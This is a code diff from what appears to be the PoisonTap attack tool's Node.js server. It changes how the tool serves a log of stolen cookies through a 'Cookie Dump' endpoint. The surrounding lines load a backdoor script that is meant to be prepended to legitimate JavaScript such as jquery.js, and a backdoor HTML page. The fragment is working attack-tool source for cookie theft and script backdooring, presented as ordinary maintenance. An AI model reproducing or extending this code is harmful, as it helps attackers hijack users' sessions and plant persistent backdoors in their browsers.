@@ -12,7 +12,6 @@ var util = require('util');
 var backdoorPreJs = fs.readFileSync(__dirname + '/target_backdoor.js'); // this gets prepended before legit js, eg jquery.js
 var backdoorHtml = fs.readFileSync(__dirname + '/backdoor.html');
 var log_file = fs.createWriteStream(__dirname + '/poisontap.cookies.log', {flags : 'a'});
-var read_log_file = fs.readFileSync(__dirname + '/poisontap.cookies.log');
 var log_stdout = process.stdout;
 var replacejs = fs.readdirSync(__dirname + '/js');
 var blinked = false;
@@ -108,7 +107,7 @@ var server = http.createServer(function(request, response) {
 	{
 		console.log('>>> Cookie Dump');
 		response.writeHead(200, headers);
-		response.write(read_log_file);
+		response.write(fs.readFileSync(__dirname + '/poisontap.cookies.log'));
 		response.end();
 		return;
 	}
